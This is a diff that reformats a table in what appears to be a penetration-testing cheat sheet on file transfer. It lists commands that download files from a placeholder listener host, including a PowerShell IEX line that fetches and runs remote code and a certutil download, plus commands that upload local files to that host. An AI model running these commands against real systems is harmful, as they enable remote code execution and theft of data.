@@ -1,16 +1,16 @@
 ## Web Server
 
-|Operation|Command|Platform|
-|---|---|---|
-|Host (files)|`sudo python3 -m http.server <port>`|Linux|
-|Host (upload)|`sudo python3 -m uploadserver <port>`|Linux|
-|Download|`wget http://<lhost>:<port>/<file> -O /tmp/<file>`|Linux|
-|Download|`curl http://<lhost>:<port>/<file> -o /tmp/<file>`|Linux|
-|Download|`IEX (New-Object Net.WebClient).DownloadString('http://<lhost>:<port>/<file>')`|Windows|
-|Download (disk)|`(New-Object Net.WebClient).DownloadFile('http://<lhost>:<port>/<file>','C:\Temp\<file>')`|Windows|
-|Download|`certutil.exe -urlcache -split -f http://<lhost>:<port>/<file> C:\Temp\<file>`|Windows|
-|Upload|`curl -X POST http://<lhost>:<port>/upload -F 'files=@/tmp/<file>'`|Linux|
-|Upload|`Invoke-WebRequest -Uri http://<lhost>:<port>/upload -Method POST -Body $b64`|Windows|
+| Operation       | Command                                                                                    | Platform |
+| --------------- | ------------------------------------------------------------------------------------------ | -------- |
+| Host (files)    | `sudo python3 -m http.server <port>`                                                       | Linux    |
+| Host (upload)   | `sudo python3 -m uploadserver <port>`                                                      | Linux    |
+| Download        | `wget http://<lhost>:<port>/<file> -O /tmp/<file>`                                         | Linux    |
+| Download        | `curl http://<lhost>:<port>/<file> -o /tmp/<file>`                                         | Linux    |
+| Download        | `IEX (New-Object Net.WebClient).DownloadString('http://<lhost>:<port>/<file>')`            | Windows  |
+| Download (disk) | `(New-Object Net.WebClient).DownloadFile('http://<lhost>:<port>/<file>','C:\Temp\<file>')` | Windows  |
+| Download        | `certutil.exe -urlcache -split -f http://<lhost>:<port>/<file> C:\Temp\<file>`             | Windows  |
+| Upload          | `curl -X POST http://<lhost>:<port>/upload -F 'files=@/tmp/<file>'`                        | Linux    |
+| Upload          | `Invoke-WebRequest -Uri http://<lhost>:<port>/upload -Method POST -Body $b64`              | Windows  |
 
 ---
 ## SCP
